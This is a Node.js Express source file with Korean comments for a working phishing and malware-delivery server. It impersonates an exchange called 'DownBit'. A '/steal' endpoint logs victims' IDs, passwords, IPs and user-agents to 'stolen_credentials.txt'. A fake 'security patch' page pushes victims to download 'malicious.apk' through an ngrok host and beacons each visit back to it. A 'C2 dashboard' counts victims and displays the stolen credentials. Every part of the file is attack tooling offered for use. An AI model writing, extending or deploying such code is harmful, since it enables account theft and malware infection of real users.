const express = require('express');
const app = express();
const fs = require('fs');
const path = require('path');

// JSON 파싱
app.use(express.json());
app.use(express.text());

// CORS 허용 (중요!)
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    next();
});

// 로그 파일 생성
const logFile = 'stolen_credentials.txt';

// 데이터 수집 엔드포인트
app.post('/steal', (req, res) => {
    const { id, pw } = req.body;
    const timestamp = new Date().toISOString();
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const ip = req.ip || req.connection.remoteAddress;
    
    console.log(`\n🔴 [${timestamp}] 계정 정보 탈취:`);
    console.log('아이디:', id);
    console.log('비밀번호:', pw);
    console.log('IP:', ip);
    console.log('User-Agent:', userAgent);
    
    // 파일에 저장
    const logEntry = `
========================================
시간: ${timestamp}
IP: ${ip}
아이디: ${id}
비밀번호: ${pw}
User-Agent: ${userAgent}
========================================\n`;
    
    fs.appendFileSync(logFile, logEntry);
    
    res.json({ status: 'success' });
});

// 성공 페이지 - APK 다운로드 유도
app.get('/success', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>DownBit - 보안 업데이트</title>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }
                body {
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                    background: linear-gradient(135deg, #D32F2F, #B71C1C);
                    min-height: 100vh;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    padding: 20px;
                }
                .container {
                    background: white;
                    border-radius: 20px;
                    padding: 40px 30px;
                    width: 100%;
                    max-width: 400px;
                    text-align: center;
                    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                }
                .logo {
                    width: 80px;
                    height: 80px;
                    background: linear-gradient(135deg, #D32F2F, #B71C1C);
                    border-radius: 50%;
                    margin: 0 auto 20px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    box-shadow: 0 10px 30px rgba(211,47,47,0.3);
                }
                .logo span {
                    color: white;
                    font-size: 36px;
                    font-weight: 900;
                }
                h1 {
                    color: #D32F2F;
                    font-size: 24px;
                    font-weight: 700;
                    margin-bottom: 10px;
                }
                .subtitle {
                    color: #666;
                    font-size: 16px;
                    margin-bottom: 30px;
                    line-height: 1.4;
                }
                .update-box {
                    background: #f8f9fa;
                    border-radius: 15px;
                    padding: 25px;
                    margin-bottom: 25px;
                    border-left: 4px solid #D32F2F;
                }
                .update-title {
                    color: #D32F2F;
                    font-size: 18px;
                    font-weight: 700;
                    margin-bottom: 15px;
                }
                .update-text {
                    color: #333;
                    font-size: 14px;
                    line-height: 1.6;
                    margin-bottom: 20px;
                }
                .download-btn {
                    background: linear-gradient(135deg, #4CAF50, #388E3C);
                    color: white;
                    padding: 15px 30px;
                    border: none;
                    border-radius: 12px;
                    font-size: 16px;
                    font-weight: 700;
                    cursor: pointer;
                    width: 100%;
                    transition: all 0.2s;
                    box-shadow: 0 4px 15px rgba(76,175,80,0.3);
                }
                .download-btn:hover {
                    transform: translateY(-2px);
                    box-shadow: 0 6px 20px rgba(76,175,80,0.4);
                }
                .version-info {
                    color: #999;
                    font-size: 12px;
                    margin-top: 15px;
                }
                .warning {
                    background: #fff3cd;
                    border: 1px solid #ffeaa7;
                    border-radius: 8px;
                    padding: 15px;
                    margin-top: 20px;
                    color: #856404;
                    font-size: 13px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">
                    <span>B</span>
                </div>
                
                <h1>보안 인증 완료</h1>
                <p class="subtitle">안전한 거래를 위한 필수 보안 업데이트가 있습니다.</p>
                
                <div class="update-box">
                    <div class="update-title">🔒 보안 패치 v2.1.8</div>
                    <div class="update-text">
                        최근 발견된 보안 취약점을 해결하기 위한 긴급 업데이트입니다.<br><br>
                        • 계정 보안 강화<br>
                        • 거래 안전성 향상<br>
                        • 피싱 방지 시스템 개선<br><br>
                        <strong>지금 즉시 업데이트하여 계정을 안전하게 보호하세요.</strong>
                    </div>
                    
                    <button class="download-btn" onclick="downloadAPK()">
                        📱 보안 업데이트 다운로드
                    </button>
                    
                    <div class="version-info">
                        파일명: DownBit_Security_v2.1.8.apk<br>
                        크기: 12.4 MB | 버전: 2.1.8
                    </div>
                </div>
                
                <div class="warning">
                    ⚠️ 보안을 위해 24시간 내에 업데이트를 완료해주세요.
                </div>
            </div>
            
            <script>
                function downloadAPK() {
                    // APK 다운로드 시뮬레이션
                    window.location.href = 'https://bf3035940d69.ngrok-free.app/download-apk';
                }
                
                // 페이지 로드 시 로그 전송
                fetch('https://bf3035940d69.ngrok-free.app/log-access', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        action: 'success_page_viewed',
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent
                    })
                }).catch(e => console.log(e));
            </script>
        </body>
        </html>
    `);
});

// APK 다운로드 엔드포인트
app.get('/download-apk', (req, res) => {
    const timestamp = new Date().toISOString();
    console.log(`📱 [${timestamp}] APK 다운로드 시도`);
    
    // 실제 APK 파일이 있다면
    const apkPath = path.join(__dirname, 'malicious.apk');
    if (fs.existsSync(apkPath)) {
        res.download(apkPath, 'DownBit_Security_v2.1.8.apk');
    } else {
        // APK 파일이 없을 때 더미 응답
        res.send(`
            <html>
            <head><title>다운로드 준비중</title></head>
            <body style="font-family: sans-serif; text-align: center; padding: 50px;">
                <h2>🔄 다운로드 준비중</h2>
                <p>보안 업데이트 파일을 준비하고 있습니다...</p>
                <p><small>잠시 후 자동으로 다운로드가 시작됩니다.</small></p>
            </body>
            </html>
        `);
    }
});

// 접근 로그 엔드포인트
app.post('/log-access', (req, res) => {
    const data = req.body;
    const timestamp = new Date().toISOString();
    
    console.log(`📊 [${timestamp}] 페이지 접근:`, data.action);
    
    const logEntry = `[${timestamp}] ${data.action} - ${data.userAgent}\n`;
    fs.appendFileSync('access.log', logEntry);
    
    res.json({ status: 'logged' });
});

// 대시보드
app.get('/dashboard', (req, res) => {
    const credentials = fs.existsSync(logFile) ? fs.readFileSync(logFile, 'utf8') : '데이터 없음';
    const accessLog = fs.existsSync('access.log') ? fs.readFileSync('access.log', 'utf8') : '로그 없음';
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>🎯 DownBit C2 Dashboard</title>
            <style>
                body { background: #000; color: #0F0; font-family: 'Courier New', monospace; padding: 20px; }
                h1 { color: #F00; text-align: center; animation: blink 1s infinite; }
                @keyframes blink { 50% { opacity: 0.5; } }
                .data-box { background: #111; border: 1px solid #0F0; padding: 20px; margin: 20px 0; border-radius: 5px; max-height: 400px; overflow-y: auto; }
                pre { white-space: pre-wrap; word-wrap: break-word; font-size: 12px; }
                .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin: 20px 0; }
                .stat-card { background: #1a1a1a; border: 1px solid #0F0; padding: 15px; text-align: center; }
            </style>
            <meta http-equiv="refresh" content="10">
        </head>
        <body>
            <h1>🎯 DOWNBIT C&C DASHBOARD 🎯</h1>
            
            <div class="stats">
                <div class="stat-card">
                    <h3>📱 피해자 수</h3>
                    <p style="font-size: 24px;">${credentials.split('========').length - 1}</p>
                </div>
                <div class="stat-card">
                    <h3>📊 총 접근</h3>
                    <p style="font-size: 24px;">${accessLog.split('\n').length - 1}</p>
                </div>
                <div class="stat-card">
                    <h3>⏰ 서버 상태</h3>
                    <p style="font-size: 24px; color: #0F0;">ONLINE</p>
                </div>
            </div>
            
            <div class="data-box">
                <h2>🔑 탈취된 계정 정보</h2>
                <pre>${credentials}</pre>
            </div>
            
            <div class="data-box">
                <h2>📋 접근 로그</h2>
                <pre>${accessLog}</pre>
            </div>
        </body>
        </html>
    `);
});

// 서버 시작
const PORT = 3000;
app.listen(PORT, () => {
    console.log(`
╔════════════════════════════════════════╗
║     🎯 DOWNBIT C&C SERVER STARTED      ║
╠════════════════════════════════════════╣
║  Server Port: ${PORT}                        ║
║  Dashboard: http://localhost:${PORT}/dashboard ║
║  Success Page: /success                ║
║  APK Download: /download-apk           ║
║  Steal Endpoint: /steal                ║
╚════════════════════════════════════════╝
    `);
});
